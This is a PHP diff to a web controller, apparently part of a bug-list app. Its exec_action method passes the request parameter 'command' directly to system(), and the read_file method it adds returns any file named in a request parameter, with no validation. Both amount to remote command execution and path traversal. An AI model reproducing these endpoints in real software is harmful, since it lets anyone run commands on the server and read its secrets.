@@ -19,14 +19,29 @@ class Index
 
         $ans=buglist::get_all();
 //        var_dump($ans);
+//        $ans='';
         return $ans;
     }
     public function exec_action(Request $request){
 //        header('Content-Type: text/html; charset=utf-8');
-        $command=(string) $_REQUEST["command"];
+//        $locale='zh_CN.UTF-8';
+//        setlocale(LC_ALL,$locale);
+//        putenv('LC_ALL='.$locale);
+        $command=$_REQUEST["command"];
+//        dump($command);
         system($command,$out);
-        return $out;
-    }
+//        return "这是一段中文";
 
+//        dump();//读取文件内容
+        return $out;
+
+    }
+    public function read_file(Request $request){
+        $filename= './' . (string)$_REQUEST["txtname"];// 默认相对路径在根目录/public下
+        $out=file_get_contents($filename);
+        return $out;
+
+//        fclose($myfile);
+    }
 
 }
